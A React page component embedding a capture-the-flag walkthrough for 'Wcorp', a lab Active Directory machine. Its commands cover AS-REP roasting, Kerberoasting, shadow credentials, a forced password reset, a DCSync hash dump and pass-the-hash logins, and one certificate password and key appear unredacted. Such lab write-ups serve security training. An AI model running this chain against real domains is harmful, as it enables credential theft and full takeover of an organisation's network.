import React from 'react';
import { Link, useNavigate } from 'react-router-dom';
import { motion } from 'framer-motion';
import { FaArrowLeft, FaCalendar, FaServer, FaStar, FaDesktop, FaNetworkWired } from 'react-icons/fa';
import TableOfContents from '../../../components/TableOfContents';
import './WcorpWalkthrough.css';

const WcorpWalkthrough = () => {
  const navigate = useNavigate();
  // Wcorp Walkthrough data
  const writeup = {
    id: 'wcorp-walkthrough',
    title: 'Wcorp Walkthrough',
    excerpt: 'Wcorp Walkthrough - Wcorp is a Windows-based Active Directory machine that involves enumerating user accounts, exploiting Kerberos vulnerabilities (AS-REP Roasting and Kerberoasting), performing lateral movement via certificate theft and abuse, and escalating privileges through DCSync to gain domain administrator access.',
    date: 'Sep 02, 2025',
    tags: ['hc', 'smb', 'ad', 'windows', 'asreproast', 'dcsync', 'kerberoasting', 'password-cracking'],
    difficulty: 'Hard',
    os: 'Windows',
    ip: '172.16.13.103',
    content: `# Wcorp Walkthrough

## Overview
Wcorp is a Windows-based Active Directory machine that involves enumerating user accounts, exploiting Kerberos vulnerabilities (AS-REP Roasting and Kerberoasting), performing lateral movement via certificate theft and abuse, and escalating privileges through DCSync to gain domain administrator access.

## Enumeration
### Port Scanning
The nmap retuned some TCP ports from the target host.
\`\`\`bash
sudo nmap -vv -sS -Pn -n -p- -sV -sC --min-rate=10000 172.16.13.103 -oN nmap/log.nmap

PORT      STATE SERVICE    REASON          VERSION
53/tcp    open  tcpwrapped syn-ack ttl 127
135/tcp   open  tcpwrapped syn-ack ttl 127
139/tcp   open  tcpwrapped syn-ack ttl 127
445/tcp   open  tcpwrapped syn-ack ttl 127
636/tcp   open  tcpwrapped syn-ack ttl 127
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc-01.wcorp.hc
| Issuer: commonName=wcorp-DC-01-CA/domainComponent=wcorp
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-04-16T06:57:57
| Not valid after:  2026-04-16T06:57:57
| MD5:   3f54:ae5d:b551:d42c:61b8:c6d8:cc13:9b99
| SHA-1: 61d6:a34a:d978:9cd1:b8cb:8310:1af5:5014:85eb:46d5
| -----BEGIN CERTIFICATE-----
| MIIFvDCCBKSgAwIBAgITdAAAAAY85rMQwKaTyAAAAAAABjANBgkqhkiG9w0BAQsF
| ADBEMRIwEAYKCZImiZPyLGQBGRYCaGMxFTATBgoJkiaJk/IsZAEZFgV3Y29ycDEX
| MBUGA1UEAxMOd2NvcnAtREMtMDEtQ0EwHhcNMjUwNDE2MDY1NzU3WhcNMjYwNDE2
| MDY1NzU3WjAAMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwtyG2vow
| DfPaJaX/cmabjfAo1nlgsujEr43q1SB9AoPl89eR1qk+JvFrAVDqp1f/5Q6uQwDB
| 1reQsi7ZPX7YC7bHq58FiGdm+SQuwyCyPrFWyG3q3wx/MSZNCYM+d1Apf6xHgffV
| Bu4X0tKHPYCPGvm2GPBVTpYhxuOWBlHJR3Zyw4JfQxb/c1uNBLcYpImZulLoGgd4
| 8swKti+R95RXmKK+o4ZHKkKkQV7yEbnIVxF+mrpA+v0xoY8rXnomv3jUu16qdbpE
| mNemSti38yJYXHCTfEtjXyvOjxbzwVZHLtS41JW3Ty5ln7d0T3KF5Mtqnkf8d2XQ
| 8dlgOQjtHCaOiQIDAQABo4IC6TCCAuUwOAYJKwYBBAGCNxUHBCswKQYhKwYBBAGC
| NxUIheLZIoHCkyCHrYcUhJG9ZYeGiSiBQwEcAgFuAgEAMCkGA1UdJQQiMCAGCCsG
| AQUFBwMCBggrBgEFBQcDAQYKKwYBBAGCNxQCAjAOBgNVHQ8BAf8EBAMCBaAwNQYJ
| KwYBBAGCNxUKBCgwJjAKBggrBgEFBQcDAjAKBggrBgEFBQcDATAMBgorBgEEAYI3
| FAICMB0GA1UdDgQWBBRrIAUDbmSUklXiHhpyV2bN3qmT/jAcBgNVHREBAf8EEjAQ
| gg5kYy0wMS53Y29ycC5oYzAfBgNVHSMEGDAWgBTVtmt+5QG35n9UmBUOqHVKDJlS
| IDCBxwYDVR0fBIG/MIG8MIG5oIG2oIGzhoGwbGRhcDovLy9DTj13Y29ycC1EQy0w
| MS1DQSxDTj1kYy0wMSxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMs
| Q049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz13Y29ycCxEQz1oYz9jZXJ0
| aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJp
| YnV0aW9uUG9pbnQwgb0GCCsGAQUFBwEBBIGwMIGtMIGqBggrBgEFBQcwAoaBnWxk
| YXA6Ly8vQ049d2NvcnAtREMtMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUy
| MFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9d2NvcnAs
| REM9aGM/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRp
| b25BdXRob3JpdHkwTwYJKwYBBAGCNxkCBEIwQKA+BgorBgEEAYI3GQIBoDAELlMt
| MS01LTIxLTEzMDE1MTE1NzEtMzYwMzkxMzI3MS0xMDA0Nzg4MTM1LTEwMDAwDQYJ
| KoZIhvcNAQELBQADggEBADX54prlSCF9xKQHad8kQj6hgIo7rwgHgTFV1x0hZiR9
| QU6PVgHNnsSvs8z6A49mz+wfPbQcGwPtfQOYjVXYpfds+M7Z7IE8b2zJExj7o179
| jlq5c5JkCeWoQkz5rFmjB6o+QLdufTGPWn0pvyTtiUoRvMCnxoC6VjBOxc4Ox662
| BGamS0HkTZdGq7kj77S17725aLYjNgqNE/H6pzEyRwlRIyjZ8hQIkXnG++W/BinW
| A08QFZADrynpsBPpZOY8PeNlxUhNMr2AyuvgQwBKeY5UVGOz/Ym59eX/4KUyWU0/
| ygqPpJiJh2yO05ml74ZcgHfEzWDQWVIGhdnOIjfHcEI=
|_-----END CERTIFICATE-----
3389/tcp  open  tcpwrapped syn-ack ttl 127
| ssl-cert: Subject: commonName=dc-01.wcorp.hc
| Issuer: commonName=dc-01.wcorp.hc
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-04-15T06:30:33
| Not valid after:  2025-10-15T06:30:33
| MD5:   8c9e:e611:d055:f2cc:c021:1ac9:825a:4599
| SHA-1: 6d34:2151:4c77:32f7:d38c:be86:cf28:d122:9efe:aae5
| -----BEGIN CERTIFICATE-----
| MIIC4DCCAcigAwIBAgIQEWx03pVc/ZJDFqkxx2luWDANBgkqhkiG9w0BAQsFADAZ
| MRcwFQYDVQQDEw5kYy0wMS53Y29ycC5oYzAeFw0yNTA0MTUwNjMwMzNaFw0yNTEw
| MTUwNjMwMzNaMBkxFzAVBgNVBAMTDmRjLTAxLndjb3JwLmhjMIIBIjANBgkqhkiG
| 9w0BAQEFAAOCAQ8AMIIBCgKCAQEArUFHsu48jwKeL1SHYzQvoUFWAl90B5z4Mbs+
| FvASEL5bvL53UoFXFc9z5TonQvgyWVGDzqNU1wgghulBmUY1oHbOjY5PtZnoYpGE
| 5Jp0PJdA4r0d1UtzvJfWxhmMw9bO3l7CoWUl3MjlsSwWDs0rJEo40GZV8jLYA/7z
| KETT844yS/2HuHejmbMuvj/gE3bhv6B5+XaxHNf7d3ERC/M97vci9rKBtRay+AAF
| zEjOAygXSnOOKm0jHFEJ5bNdQoVwOtO4ozEtAqZhRPCjhIXn8PvJgU8B76k6Y1rb
| CcupgKGOgK90U5DbE5tFax3d0BPvWlEm8Fj+tp5LdIlJvsCfPQIDAQABoyQwIjAT
| BgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQAD
| ggEBAJZW0JeQGC+bcpqSvPdrElWiSaXomMJ1EX/xiQMt+htZ9Lgg3Afv2O79RLiF
| Tp7Gt8tRssxHleMWeM1Cupz6RH0571B4V01EHCOeNV5Ro2VwoiKasDwimmOqjqas
| NSIu2aZMw1gFEMhKSJJ8a7JIc61g0mbBRHZFdxbDLKkg94DV+I1n8wyxB5WcCn8R
| 2PeejkgyvfZcExdNbtzSlA+zxU9ZmXJHu7KfTn8/g3/yd9knikDXzcHYXpsst7rZ
| vwTd5gWsSbrtI7un77L77hPa2eu9lSlgEtH8s+aYDM46SqHJZFozkUunh0Z5O7dq
| Ua0SJNl4cUoYVTy5NFh/m1pS93U=
|_-----END CERTIFICATE-----
|_ssl-date: 2025-04-21T02:51:41+00:00; 0s from scanner time.
49664/tcp open  tcpwrapped syn-ack ttl 127

Host script results:
|_smb2-security-mode: Couldn't establish a SMBv2 connection.
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 26190/tcp): CLEAN (Timeout)
|   Check 2 (port 24015/tcp): CLEAN (Timeout)
|   Check 3 (port 56269/udp): CLEAN (Timeout)
|   Check 4 (port 11722/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: 0s
|_smb2-time: Protocol negotiation failed (SMB2)
\`\`\`

## Service Enumeration
Adding the domains into \`hosts\` file.
\`\`\`bash
echo "172.16.13.103 dc-01.wcorp.hc wcorp.hc" | sudo tee -a /etc/hosts
\`\`\`

Enumerating the available SMB shares on the target host using the \`guest\` account without a password.
\`\`\`bash
nxc smb 172.16.13.103 -u 'guest' -p '' --shares
\`\`\`
![Kerbrute User Enumeration](/images/writeups/wcorp/1.png)

Enumerating domain users and groups from the target Domain Controller with the RID brute-force.
\`\`\`bash
nxc smb 172.16.13.103 -u 'guest' -p '' --rid-brute
\`\`\`
![Kerbrute User Enumeration](/images/writeups/wcorp/2.png)

Save the result into a file, filter out and save only the usernames.
\`\`\`bash
cat a | grep "SidTypeUser" | awk -F " " '{print $6}' | cut -d '\' -f 2 > users.txt

Administrator
Guest
krbtgt
DC-01$
john.doe
alice.hr
bob.finance
charlie.dev
diana.ops
svc_backup
svc_web
\`\`\`

Testing username as password logins over SMB. Also, netexec returned that \`svc_backup\` account is vulnerable to AS-REP roasting attack.
\`\`\`bash
nxc smb 172.16.13.103 -u users.txt -p users.txt --continue-on-success --no-bruteforce -k
\`\`\`
![Kerbrute User Enumeration](/images/writeups/wcorp/3.png)

### Exploitation
As \`svc_backup\` is vulnerable to AS-REP roasting, we can request the TGT ticket for this user and attempt to crack it offline.
\`\`\`bash
impacket-GetNPUsers -dc-ip 172.16.13.103 -k -request -usersfile users.txt wcorp.hc/
\`\`\`
![Kerbrute User Enumeration](/images/writeups/wcorp/4.png)

Cracked AS-REP hash revealed the password for the \`svc_backup\` account.
\`\`\`bash
hashcat -m 18200 -a 0 hash /usr/share/wordlists/rockyou.txt
\`\`\`
![Kerbrute User Enumeration](/images/writeups/wcorp/5.png)

## Privilege Escalation
### Lateral Movement - Kerberoasting
Running \`bloodHound-python\` with \`svc_backup\` credentials to enumerate the Active Directory domain and collect all information for privilege escalation analysis.
\`\`\`bash
bloodhound-python -u 'svc_backup' -p <REDACTED> -d wcorp.hc -ns 172.16.13.103 -gc dc-01.wcorp.hc -c all --zip
\`\`\`

Using Impacket’s \`GetUserSPNs\` tool to query Service Principal Names (SPNs) in the domain using the \`svc_backup\` credentials. SPNs identify services running under domain accounts, and by targeting them, the \`-request\` flag triggers Kerberos pre-authentication to retrieve their hashes. In this case, it returns the hash of the \`svc_web\` service account.
\`\`\`bash
impacket-GetUserSPNs wcorp.hc/svc_backup:<REDACTED> -dc-ip 172.16.13.103 -request
\`\`\`
![Kerbrute User Enumeration](/images/writeups/wcorp/8.png)

Cracking the Kerberos hash to reveal the password for the \`svc_web\` service account.
\`\`\`bash
john hash2 --wordlist=/usr/share/wordlists/rockyou.txt
\`\`\`
![Kerbrute User Enumeration](/images/writeups/wcorp/9.png)

Validating the \`svc_web\` credentials.
\`\`\`bash
nxc smb 172.16.13.103 -u 'svc_web' -p <REDACTED>
\`\`\`
![Kerbrute User Enumeration](/images/writeups/wcorp/10.png)

### Lateral Movement - GenericWrite
We can see that the \`svc_web\` service account have GenericWrite permission into \`john.doe\` account, as we can modify the \`msDS-KeyCredentialLink\` attribute of the target object.
![Kerbrute User Enumeration](/images/writeups/wcorp/11.png)

Using svc_web credentials, run \`PyWhisker\` to add a shadow credential to \`john.doe\`.
\`\`\`bash
python3 pywhisker/pywhisker.py -d "wcorp.hc" -u "svc_web" -p <REDACTED> --target "john.doe" --action "add"
\`\`\`
![Kerbrute User Enumeration](/images/writeups/wcorp/12.png)

With \`john.doe\` certificate, we can request a Kerberos TGT via PKINIT and saved it to \`john.doe.ccache\`.
\`\`\`bash
python3 gettgtpkinit.py wcorp.hc/john.doe -cert-pfx ../21xt5tDC.pfx -pfx-pass fdctLKRAwKFEoeJXkn36 john.doe.ccache
\`\`\`
![Kerbrute User Enumeration](/images/writeups/wcorp/13.png)

Authenticating as \`john.doe via\` with Evil-WinRM using the NTLM hash for authentication.
\`\`\`bash
export KRB5CCNAME=john.doe.ccache
python3 getnthash.py wcorp.hc/john.doe -key 5c1a753f3dca1b07c5e6a1dc5eae7e52fe578eef2b873fc1e7afe828f26911ce
\`\`\`
![Kerbrute User Enumeration](/images/writeups/wcorp/14.png)

Authenticating as \`john.doe via\` with Evil-WinRM using the NTLM hash for authentication.
\`\`\`bash
nxc smb 172.16.13.103 -u 'john.doe' -H 'a59c<REDACTED>'
\`\`\`
![Kerbrute User Enumeration](/images/writeups/wcorp/15.png)

### User Flag
Authenticating as \`john.doe\` via LDAP with rpcclient. We will find the flag on his description attribute.
\`\`\`bash
rpcclient -U 'john.doe%a59c<REDACTED>' --pw-nt-hash 172.16.13.103
\`\`\`
![Kerbrute User Enumeration](/images/writeups/wcorp/16.png)

### Privilege Escalation - DCSync
User \`john.doe\` have some outbounds permissions on Active Directory, we can make a GenericAll into the DC-01 computer and we also have \`ForceChangePassword\` permission into the \`diana.ops\`. The \`diana.ops\` account have some permissions into the Domain object that allows the DCSync attack.
![Kerbrute User Enumeration](/images/writeups/wcorp/17.png)
![Kerbrute User Enumeration](/images/writeups/wcorp/18.png)

Changing the password of \`diana.ops\` using \`john.doe\` hash.
\`\`\`bash
impacket-changepasswd 'wcorp.hc'/'diana.ops'@172.16.13.103 -reset -altuser 'john.doe' -althash ':a59c<REDACTED>' -newpass 'P@ssw0rd'
\`\`\`
![Kerbrute User Enumeration](/images/writeups/wcorp/19.png)

Making the DCSync attack against the domain controller to dump all password hashes with \`diana.ops\` new credentials.  
\`\`\`bash
impacket-secretsdump 'wcorp.hc'/'diana.ops':'P@ssw0rd'@dc-01.wcorp.hc
\`\`\`
![Kerbrute User Enumeration](/images/writeups/wcorp/20.png)

### Root Flag
Validating the \`Administrator\` credentials with netexec.
\`\`\`bash
nxc smb 172.16.13.103 -u 'Administrator' -H 'bca9<REDACTED>'
\`\`\`
![Kerbrute User Enumeration](/images/writeups/wcorp/21.png)

Authenticting as \`Administrator\` and retrieving the root flag.
\`\`\`bash
evil-winrm -i wcorp.hc -u 'Administrator' -H 'bca9<REDACTED>'
\`\`\`
![Kerbrute User Enumeration](/images/writeups/wcorp/22.png)
`
  };

  return (
    <motion.div 
      className="writeup-detail-page"
      initial={{ opacity: 0, y: 20 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ duration: 0.6 }}
    >
      <div className="writeup-header">
        <Link to="/writeups" className="back-button">
          <FaArrowLeft />
          <span>Back to Writeups</span>
        </Link>
        
        <motion.div 
          className="writeup-title-section"
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.2, duration: 0.6 }}
        >
          <h1>{writeup.title}</h1>
          
          <div className="writeup-meta">
            <div className="meta-item">
              <FaCalendar />
              <span>{writeup.date}</span>
            </div>
          </div>

          <div className="writeup-tags">
            {writeup.tags.map((tag, index) => (
              <motion.span
                key={tag}
                className="tag-badge"
                initial={{ scale: 0, opacity: 0 }}
                animate={{ scale: 1, opacity: 1 }}
                transition={{ delay: 0.3 + index * 0.1, duration: 0.3 }}
                whileHover={{ scale: 1.1 }}
                style={{ cursor: 'pointer' }}
                onClick={() => navigate(`/tags/${String(tag).toLowerCase()}`)}
              >
                {tag}
              </motion.span>
            ))}
          </div>
          
          <div className="machine-info">
            <div className="machine-info-content">
              <div className="machine-info-left">
                <h6><FaServer /> Machine Information:</h6>
                <div className="machine-info-vertical">
                  <div className="info-item">
                    <FaDesktop /> OS: 
                    <img 
                      src={`/os-icons/${writeup.os}.png`} 
                      alt={`${writeup.os} Icon`} 
                      className="os-icon"
                      onError={(e) => {
                        e.target.style.display = 'none';
                        e.target.nextSibling.style.display = 'inline';
                      }}
                    />
                  </div>
                  <div className="info-item">
                    <FaStar /> Difficulty: {writeup.difficulty}
                  </div>
                  <div className="info-item">
                    <FaNetworkWired /> IP: {writeup.ip}
                  </div>
                </div>
              </div>
              <div className="machine-info-right">
                <img src="/images/writeups/wcorp/machine.png" alt="Wcorp Walkthrough" className="machine-image" />
              </div>
            </div>
          </div>
        </motion.div>
      </div>

      <div className="writeup-layout">
        <motion.div 
          className="writeup-content"
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.4, duration: 0.6 }}
        >
          <div className="markdown-content">
            {(() => {
              const lines = writeup.content.split('\n');
              const elements = [];
              let i = 0;
              
              while (i < lines.length) {
                const line = lines[i];
                
                if (line.startsWith('# ')) {
                  elements.push(<h1 key={i}>{line.substring(2)}</h1>);
                } else if (line.startsWith('## ')) {
                  elements.push(<h2 key={i}>{line.substring(3)}</h2>);
                } else if (line.startsWith('### ')) {
                  elements.push(<h3 key={i}>{line.substring(4)}</h3>);
                } else if (line.startsWith('```')) {
                  // Handle code blocks
                  const language = line.substring(3).trim();
                  const codeLines = [];
                  i++;
                  
                  while (i < lines.length && !lines[i].startsWith('```')) {
                    codeLines.push(lines[i]);
                    i++;
                  }
                  
                  elements.push(
                    <pre key={i}>
                      <code className={language ? `language-${language}` : ''}>
                        {codeLines.join('\n')}
                      </code>
                    </pre>
                  );
                } else if (line.startsWith('![')) {
                  // Handle images
                  const match = line.match(/!\[(.*?)\]\((.*?)\)/);
                  if (match) {
                    const [, alt, src] = match;
                    elements.push(
                      <div key={i} className="image-container">
                        <img src={src} alt={alt} className="content-image" />
                      </div>
                    );
                  }
                } else if (line.trim()) {
                  // Process inline markdown
                  const processedLine = line
                    .replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>') // Bold
                    .replace(/\*(.*?)\*/g, '<em>$1</em>') // Italic
                    .replace(/`(.*?)`/g, '<code class="inline-code">$1</code>'); // Inline code
                  
                  elements.push(
                    <p key={i} dangerouslySetInnerHTML={{ __html: processedLine }} />
                  );
                } else {
                  elements.push(<br key={i} />);
                }
                
                i++;
              }
              
              return elements;
            })()}
          </div>
        </motion.div>
        <TableOfContents content={writeup.content} />
      </div>
    </motion.div>
  );
};

export default WcorpWalkthrough;
